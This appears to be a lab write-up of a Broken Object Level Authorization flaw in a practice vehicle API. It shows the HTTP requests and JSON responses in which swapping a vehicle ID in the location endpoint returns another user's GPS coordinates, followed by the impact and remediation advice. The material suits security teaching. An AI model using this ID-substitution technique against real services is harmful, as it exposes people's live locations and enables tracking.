  
## Vulnerability Metadata  
  
| Field | Value |  
|---------|---------|  
| Vulnerability Type | Broken Object Level Authorization (BOLA) |  
| CWE | CWE-639: Authorization Bypass Through User-Controlled Key |  
| CVSS v3.1 | 7.1 (High) |  
| OWASP API Top 10 | API1:2023 – Broken Object Level Authorization |  
| Affected Endpoint | `/identity/api/v2/vehicle/{vehicleId}/location` |  
| HTTP Method | GET |  
  
---  
  
## Description  
  
Object Level Authorization is an access control mechanism that ensures users can only access resources they are authorized to view or manipulate. The application fails to enforce proper authorization checks on vehicle objects, allowing authenticated users to access information belonging to other users by modifying the vehicle identifier supplied in the request.  
  
The backend trusts the user-controlled `vehicleId` parameter without validating ownership of the requested resource. As a result, an attacker can enumerate valid vehicle identifiers and retrieve sensitive information associated with other users.

### Step 1 – Obtain Vehicle Information  
  
After purchasing a vehicle, the application sends an email containing sensitive vehicle details, including the Vehicle Identification Number (VIN) and the associated PIN code required to access vehicle information.  
  
The email disclosed the following information:  
  
```text  
VIN: U70UHLS52U24HOR39  
PIN: 7579  
```

![[Attachments/Pasted image 20260530131137.png]]


### Step 2 – Verify Vehicle Ownership  
  
Using the VIN and PIN code obtained from the email, navigate to the vehicle verification portal and submit the provided credentials.  
  
The application successfully validates the information and grants access to the vehicle profile.  
  
This demonstrates that possession of the VIN and PIN is sufficient to access vehicle-related information.  
  
---

![[Attachments/Pasted image 20260530131211.png]]

### Step 3 – Access Vehicle Information  
  
After successful verification, the application displays detailed information about the vehicle, including:  
  
- Vehicle Identification Number (VIN)  
- Manufacturer  
- Model  
- Fuel Type  
- Production Year  
- Current Vehicle Location  
- Service History Functionality  
- Mechanic Contact Functionality  
  
The application also exposes a map containing the current geographical location of the vehicle.


![[Attachments/Pasted image 20260530131251.png]]

### Step 4 – Refresh Vehicle Location  
  
By clicking the **Refresh Location** button, the application retrieves the most recent GPS coordinates associated with the vehicle.  
  
The request generates a backend API call that returns the current location data for the vehicle.  
  
This functionality exposes sensitive geolocation information and can subsequently be leveraged during the exploitation of the Broken Object Level Authorization vulnerability by manipulating vehicle identifiers within backend API requests.  
  
The ability to refresh and retrieve real-time location information increases the overall impact of the vulnerability, as an attacker may gain unauthorized access to the live location of vehicles belonging to other users.

## Proof of Concept  
  
### Step 5 – Identify a Vehicle Identifier  
  
While browsing community posts, vehicle information is exposed through API responses. The response contains a vehicle identifier associated with a user account.  
  
Example response:  
  
```json  
{  
"author": {  
"email": "attacker@test.local",  
"vehicleId": "383f81cd-9d24-40fe-a0e3-727fc1c0d62e"  
}  
}  
```

![[Attachments/Pasted image 20260530133930.png]]

 From the above information we can use the vehicle id to gain information about other users
### Step 6 – Retrieve Vehicle Location Information  
  
The application retrieves vehicle location data using the following endpoint:  
  
```http  
GET /identity/api/v2/vehicle/796def89-4a5c-48ad-88a7-45850e62900f/location HTTP/1.1  
Host: localhost:8888  
Authorization: Bearer <JWT>  
```  
  
Response:  
  
```json  
{  
"carId":"796def89-4a5c-48ad-88a7-45850e62900f",  
"vehicleLocation":{  
"id":1,  
"latitude":"32.778889",  
"longitude":"-91.919243"  
},  
"fullName":"hacker",  
"email":"hacker@gmail.com"  
}  
```


![[Attachments/Pasted image 20260530131840.png]]


### Step 7 – Modify the Object Identifier  
  
Replace the original vehicle identifier with another valid identifier obtained from community content
```http  
GET /identity/api/v2/vehicle/383f81cd-9d24-40fe-a0e3-727fc1c0d62e/location HTTP/1.1  
Host: localhost:8888  
Authorization: Bearer <JWT>  
```


![[Attachments/Pasted image 20260530132003.png]]

We can change the id in burp and voila, we have our result
**from 796def89-4a5c-48ad-88a7-45850e62900f to  383f81cd-9d24-40fe-a0e3-727fc1c0d62e**

![[Attachments/Pasted image 20260530132113.png]]

### Step 8 – Unauthorized Access Confirmed  
  
The server returns location information belonging to another user.  
  
```json  
{  
"carId":"383f81cd-9d24-40fe-a0e3-727fc1c0d62e",  
"vehicleLocation":{  
"id":3,  
"latitude":"37.746880",  
"longitude":"-84.301460"  
},  
"fullName":"attacker",  
"email":"attacker@test.local"  
}  
```  
  
The successful response demonstrates that authorization checks are not performed on the requested object, allowing access to resources belonging to other users.  
  
---
## Impact  
  
- Unauthorized access to sensitive user information.  
- Disclosure of real-time vehicle location data.  
- Privacy violations affecting all registered users.  
- Potential physical tracking of vehicle owners.  
- Increased risk of privilege escalation through chained attacks.  
- Unauthorized access to additional resources associated with the affected account.  
  
---  
  
## Remediation  
  
### Implement Object-Level Authorization Checks  
  
Before returning any resource, verify that the authenticated user is authorized to access the requested object.  
  
Example authorization workflow:  
  
1. Extract the authenticated user identity from the JWT or session.  
2. Retrieve the requested vehicle object.  
3. Verify ownership of the vehicle.  
4. Return **403 Forbidden** if the user is not authorized.  
  
### Enforce Server-Side Authorization  
  
Never rely on client-supplied identifiers for access control decisions.  
  
### Apply Least Privilege Principles  
  
Users should only have access to resources explicitly assigned to their accounts.  
  
### Perform Authorization Testing  
  
Regularly test endpoints that expose object identifiers, including:  
  
- Vehicle IDs  
- User IDs  
- Account IDs  
- Order IDs  
- Transaction IDs  
  
---  
  
## References  
  
- OWASP API Security Top 10 – API1:2023 Broken Object Level Authorization  
- CWE-639: Authorization Bypass Through User-Controlled Key  
- OWASP Web Security Testing Guide (WSTG)
- 